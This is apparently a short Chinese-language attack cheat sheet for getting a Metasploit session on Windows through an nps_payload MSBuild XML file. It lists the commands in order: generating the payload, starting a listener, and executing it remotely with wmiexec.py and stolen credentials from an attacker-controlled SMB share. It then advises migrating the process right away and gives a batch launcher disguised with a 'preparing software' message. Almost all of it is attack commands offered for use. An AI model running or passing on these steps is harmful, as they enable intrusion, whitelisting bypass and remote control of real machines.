	>python nps_payload.py正常生成
	>msfconsole -r msbuild_nps.rc开启监听
	>%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe xx.xml
	>wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
	正常执行结束进程msbuild会失去会话，以下保存bat执行
	获得session后立刻迁移进程
	@echo off
	echo [*] Please Wait, preparing software ..
	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Microsoft.NET\Framework\v4.0.30319\xxx.xml
	exit